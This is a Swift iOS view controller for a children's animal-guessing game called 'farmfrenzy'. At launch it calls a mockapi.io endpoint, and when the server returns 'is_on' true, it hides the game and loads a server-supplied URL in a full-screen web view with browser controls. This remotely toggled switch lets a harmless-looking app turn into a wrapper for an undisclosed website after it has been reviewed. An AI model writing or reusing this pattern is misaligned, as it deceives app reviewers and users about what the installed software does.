//
//  ViewController.swift
//  farmfrenzy
//
//  Created by Clement Gan on 30/10/2024.
//

import UIKit
import WebKit

class ViewController: UIViewController {
    
    @IBOutlet weak var gameBgView: UIView!
    @IBOutlet weak var scoreLabel: UILabel!
    @IBOutlet weak var objectDescLabel: UILabel!
    
    @IBOutlet weak var centerBgView: UIView!
    @IBOutlet weak var button1: UIButton!
    @IBOutlet weak var button2: UIButton!
    @IBOutlet weak var button3: UIButton!
    @IBOutlet weak var button4: UIButton!
    @IBOutlet weak var button5: UIButton!
    
    let buttonWidth: CGFloat = 70
    let buttonHeight: CGFloat = 70
    
    let buttonSize: CGFloat = 70
    var buttons: [UIButton] = []
    let maxButtons = 5
    
    var objectsArray = [
        ["name": "Chick", "desc": "A small, fluffy bird that just hatched from an egg."],
        ["name": "Skunk", "desc": "A black and white animal with a smelly spray to protect itself."],
        ["name": "Turtle", "desc": "A creature with a hard shell that moves very slowly."],
        ["name": "Chicken", "desc": "A bird that lays eggs and makes a cluck sound."],
        ["name": "Porcupine", "desc": "A special animal covered in sharp, stiff quills that look like tiny spikes, to keep predators away."],
        ["name": "Frog", "desc": "A green amphibian lives both in water and on land, it's long back leg can help them jump very high."],
        ["name": "Goose", "desc": "A large bird with a long neck that makes a loud honk sound."],
        ["name": "Wild Boar", "desc": "A wild pig that have sharp tusks that stick out from their mouths."],
        ["name": "Toad", "desc": "A bumpy amphibian that has dry, bumpy skin and shorter legs, and they makes a croak sound."],
        ["name": "Pig", "desc": "A sturdy, pink farm animal known for its curly tail and round body."],
        ["name": "Snow Fox", "desc": "A fluffy animal that has short ears and bushy tail. They lives in cold, snowy areas."],
        ["name": "Crab", "desc": "A small sea animal with a hard shell, and they can walk sideways."],
        ["name": "Sheep", "desc": "A fluffy farm animal that usually has a white coat of wool."],
        ["name": "Wolf", "desc": "A wild animal have thick fur, sharp teeth, and a loud howl. They live and hunt in groups called packs."],
        ["name": "Cat", "desc": "A furry pet that has playful. They love to purrs and meows."]
    ].shuffled()
    
    var correctAnswerIndex = Int.random(in: 0...3)
    
    var isShowResult = false
    var resultTitle = ""
    var resultMessage = ""
    var currentScore = 0
    
    
    @IBOutlet weak var stackView: UIStackView!
    @IBOutlet weak var webView: WKWebView!
    @IBOutlet weak var tabBarBgView: UIView!
    
    @IBOutlet weak var homeButton: UIButton!
    @IBOutlet weak var leftButton: UIButton!
    @IBOutlet weak var rightButton: UIButton!
    @IBOutlet weak var refreshButton: UIButton!
    
    @IBOutlet weak var floatingBgView: UIView!
    @IBOutlet weak var triggerTabBarButton: UIButton!
    
    
    var urlString = ""
    var homepageUrlString = ""
    
    let safeAreaHeight: CGFloat = 20
    let tabBarHeight: CGFloat = 50
    let panGesture = UIPanGestureRecognizer()
    
    var isCollapse: Bool = false
    var isHideTabBar: Bool = false
    
    
    // MARK: - View Lifecycle
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        resetRound()
        
        
        floatingBgView.isHidden = true
        floatingBgView.layer.cornerRadius = 10
        
        panGesture.addTarget(self, action: #selector(draggedView(sender:)))
        panGesture.cancelsTouchesInView = true
        
        callApiToCheckStatus()
        
    }
    
    func resetRound() {
        
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            
            objectsArray.shuffle()
            correctAnswerIndex = Int.random(in: 0...4)
            
            objectDescLabel.text = objectsArray[correctAnswerIndex]["desc"]
            scoreLabel.text = "Score: \(currentScore)"
            
            resetAllButtons()
            
        }
        
    }
    
    // MARK: - Button Tap Event
    
    @objc func buttonTapped(_ sender: UIButton) {
        
//        resetRound()
        
//        guard let button = sender as? UIButton else { return }
        
        if sender.tag == correctAnswerIndex {
            currentScore += 1
            resultTitle = "Correct !!"
            resultMessage = "It is \(objectsArray[sender.tag]["name"]!) ! Your score is \(currentScore)."
            
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                
                let alert = CustomAlertView(title: "Correct !!", message: resultMessage)
                alert.dismissHandler = {
                    self.resetRound()
                }
                alert.show(in: self.view)
            }
            
            
        } else {
            resultTitle = "Incorrect !!"
            resultMessage = "The answer is \(objectsArray[correctAnswerIndex]["name"]!) ! You selected \(objectsArray[sender.tag]["name"]!)"
            
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                
                let alert = CustomAlertView(title: "Incorrect !!", message: resultMessage)
                alert.dismissHandler = {
                    self.resetRound()
                }
                alert.show(in: self.view)
            }
        }
//        isShowResult = true
        
//        DispatchQueue.main.async { [weak self] in
//            guard let self = self else { return }
//            
//            let alertC = UIAlertController(title: self.resultTitle, message: self.resultMessage, preferredStyle: .alert)
//            let okAction = UIAlertAction(title: "Play Again", style: .default) { (action) in
//                self.resetRound()
//            }
//            alertC.addAction(okAction)
//            
//            self.present(alertC, animated: false)
//        }
        
    }
    
    func generateButtons() {
        for index in 0..<maxButtons {
            if let randomFrame = getRandomFrame() {
                let button = UIButton(frame: randomFrame)
                button.backgroundColor = .clear
//                button.setTitle("\(buttons.count + 1)", for: .normal)
                button.setImage(UIImage(named: objectsArray[index]["name"]!), for: .normal)
                button.addTarget(self, action: #selector(buttonTapped(_:)), for: .touchUpInside)
                button.tag = index
                
                buttons.append(button)
                centerBgView.addSubview(button) // Add to the main view (or container view)
            }
        }
    }
    
    func resetAllButtons() {
        DispatchQueue.main.async { [weak self] in
            
            guard let self = self else { return }
            
            for button in buttons {
                button.removeFromSuperview()
            }
            buttons = []
            
            generateButtons()
        }
    }
    
    func getRandomFrame() -> CGRect? {
            let containerWidth = centerBgView.bounds.width
            let containerHeight = centerBgView.bounds.height
            
            var randomFrame: CGRect

            // Generate random frame and check for overlaps
            var attempts = 0
            repeat {
                let randomX = CGFloat.random(in: 0...(containerWidth - buttonSize))
                let randomY = CGFloat.random(in: 0...(containerHeight - buttonSize))
                randomFrame = CGRect(x: randomX, y: randomY, width: buttonSize, height: buttonSize)
                attempts += 1
                
                // Prevent excessive attempts
                if attempts > 100 {
                    return nil // Give up if too many attempts
                }
            } while isOverlapping(with: randomFrame)

            return randomFrame
        }
    
    func getNewPosition(frameHeightWidth: CGFloat) -> CGFloat {
        CGFloat.random(in: 50...frameHeightWidth)
    }
    
    func isOverlapping(with newFrame: CGRect) -> Bool {
        for button in buttons {
            if button.frame.intersects(newFrame) {
                return true
            }
        }
        
        return false
    }
    
}

extension ViewController {
    
    // MARK: - Call Api
    
    func callApiToCheckStatus() {
        let semaphore = DispatchSemaphore (value: 0)
        
        var request = URLRequest(url: URL(string: "https://6703907dab8a8f892730a6d2.mockapi.io/api/v1/guessanimal")!, timeoutInterval: 5.0)
        request.httpMethod = "GET"
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { [weak self] in
                    guard let self = self else { return }
//                    self.loadingView.stopAnimating()
                }
//                print(String(describing: error))
                semaphore.signal()
                return
            }
//            print("\n[ViewController] thesnake data: ")
//            print(String(data: data, encoding: .utf8)!)
            do {
                let json = try JSONSerialization.jsonObject(with: data) as? [[String:Any]]
//                print("\nCheck json data: ", json)
                
                if let isOpen = json?[0]["is_on"] as? Bool {
                    if isOpen == true {
                        self.urlString = json?[0]["url"] as? String ?? ""
                        if let url = URL(string: self.urlString) {
                            let request = URLRequest(url: url)
                            
                            DispatchQueue.main.async { [weak self] in
                                guard let self = self else { return }
                                
                                triggerTabBarButton.addGestureRecognizer(panGesture)
                                triggerTabBarButton.touchesCancelled([], with: nil)
                                
                                self.view.backgroundColor = .black
                                self.gameBgView.isHidden = true
                                self.floatingBgView.isHidden = false
                                self.webView.isHidden = false
                                self.webView.load(request)
                                
                                self.webView.uiDelegate = self
                                self.webView.navigationDelegate = self
                                
                                stackView.isHidden = false
                                tabBarBgView.isHidden = false
                                tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height-tabBarHeight-safeAreaHeight, width: self.view.bounds.width, height: tabBarHeight)
                            }
                        }
                        else {
                            DispatchQueue.main.async { [weak self] in
                                guard let self = self else { return }
                                
//                                configureGameView()
                                
                                self.view.backgroundColor = .white
                                self.gameBgView.isHidden = false
                                self.floatingBgView.isHidden = true
                                self.webView.isHidden = true
//                                self.startNewGame()
                                
                                stackView.isHidden = true
                                tabBarBgView.isHidden = true
                                tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height, width: self.view.bounds.width, height: 0)
                            }
                        }
                    }
                    else {
                        DispatchQueue.main.async { [weak self] in
                            guard let self = self else { return }
                            
//                            configureGameView()
                            
                            self.view.backgroundColor = .white
                            self.gameBgView.isHidden = false
                            self.floatingBgView.isHidden = true
                            self.webView.isHidden = true
//                            self.startNewGame()
                            
                            stackView.isHidden = true
                            tabBarBgView.isHidden = true
                            tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height, width: self.view.bounds.width, height: 0)
                        }
                    }
                }
                else {
                    DispatchQueue.main.async { [weak self] in
                        guard let self = self else { return }
                        
//                        configureGameView()
                        
                        self.view.backgroundColor = .white
                        self.gameBgView.isHidden = false
                        self.floatingBgView.isHidden = true
                        self.webView.isHidden = true
//                        self.startNewGame()
                        
                        stackView.isHidden = true
                        tabBarBgView.isHidden = true
                        tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height, width: self.view.bounds.width, height: 0)
                    }
                    
                }
                
//                let jsonData = try JSONDecoder().decode([GetDataResponse].self, from: data)
//                print("\nJson data:")
//                print(jsonData)
                
            } catch let jsonError {
//                print("[API checkStatus] Failed to decode:", jsonError)
                DispatchQueue.main.async { [weak self] in
                    guard let self = self else { return }
                    
//                    configureGameView()
                    
                    self.view.backgroundColor = .white
                    self.gameBgView.isHidden = false
                    self.floatingBgView.isHidden = true
                    self.webView.isHidden = true
//                    self.startNewGame()
                    
                    stackView.isHidden = true
                    tabBarBgView.isHidden = true
                    tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height, width: self.view.bounds.width, height: 0)
                }
            }
            semaphore.signal()
        }
        
        task.resume()
        semaphore.wait()
    }
    
    @IBAction func button2OnTapped(_ sender: Any) {
        
        guard let button = sender as? UIButton else { return }
        
        if button == homeButton {
            if let url = URL(string: self.homepageUrlString) {
                let request = URLRequest(url: url)
                
                DispatchQueue.main.async { [weak self] in
                    guard let self = self else { return }
                    self.webView.load(request)
                }
            }
        }
        else if button == leftButton {
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                self.webView.goBack()
            }
        }
        else if button == rightButton {
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                self.webView.goForward()
            }
        }
        else if button == refreshButton {
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                self.webView.reload()
            }
        }
        else if button == triggerTabBarButton {
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                
                isHideTabBar = !isHideTabBar
                tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height-tabBarHeight, width: self.view.bounds.width, height: isHideTabBar == true ? 0 : tabBarHeight)
                tabBarBgView.isHidden = isHideTabBar == true ? true : false
                
                if isHideTabBar == true {
                    webView.frame = CGRect(x: 0, y: tabBarHeight, width: self.view.bounds.width, height: self.view.bounds.height-tabBarHeight)
                    tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height+safeAreaHeight, width: self.view.bounds.width, height: 0)
                }
                else {
                    webView.frame = CGRect(x: 0, y: tabBarHeight, width: self.view.bounds.width, height: self.view.bounds.height-tabBarHeight-safeAreaHeight-tabBarHeight)
                    tabBarBgView.frame = CGRect(x: 0, y: self.view.bounds.height-tabBarHeight-safeAreaHeight, width: self.view.bounds.width, height: tabBarHeight)
                }
            }
        }
        // end else if
        
    }
    
    // MARK: - Orientation Change
    
    @objc func orientationChange() {
        draggedView(sender: panGesture)
    }
    
    // MARK: - Floating View Pan Gesture
    
    @objc func draggedView(sender: UIPanGestureRecognizer) {
        self.view.bringSubviewToFront(floatingBgView)
        let translation = sender.translation(in: self.view)
        let xPostion = floatingBgView.center.x + translation.x
        let yPostion = floatingBgView.center.y + translation.y - floatingBgView.frame.height
        
        if UIDevice.current.orientation == .portrait {
            if (xPostion >= 25 && xPostion <= self.view.frame.size.width - 25) && (yPostion >= 30 && yPostion <= self.view.frame.size.height-150) {
                floatingBgView.center = CGPoint(x: floatingBgView.center.x + translation.x, y: floatingBgView.center.y + translation.y)
                sender.setTranslation(.zero, in: self.view)
                
            }
        }
        else {
            if (xPostion >= (25+48) && xPostion <= self.view.frame.size.width - (25+48) ) && (yPostion >= -20 && yPostion <= self.view.frame.size.height-100) {
                floatingBgView.center = CGPoint(x: floatingBgView.center.x + translation.x, y: floatingBgView.center.y + translation.y)
                sender.setTranslation(.zero, in: self.view)
                
            }
        }
        
    }
    
}

// MARK: - Web View UI Delegate

extension ViewController: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if (!(navigationAction.targetFrame?.isMainFrame ?? false)) {
            self.webView.load(navigationAction.request)
            
//            homepageUrlString = "\(navigationAction.request.url)"
//            print("\nCreate webview with: ")
//            print("homepageUrlString: ", homepageUrlString)
        }
        
        return nil
    }
}

// MARK: - Web View Navigation Delegate

extension ViewController: WKNavigationDelegate {
//    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction) async -> WKNavigationActionPolicy {
//        homepageUrlString = "\(navigationAction.request.url)"
//        print("\nDecidePolicyFor: ")
//        print("homepageUrlString: ", homepageUrlString)
//        return .allow
//    }
    
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        if let newUrl = webView.url?.absoluteString {
            if homepageUrlString.count == 0 {
                homepageUrlString = newUrl
//                print("\nDidReceiveServerRedirect: ")
//                print("homepageUrlString: ", homepageUrlString)
            }
        }
    }
}

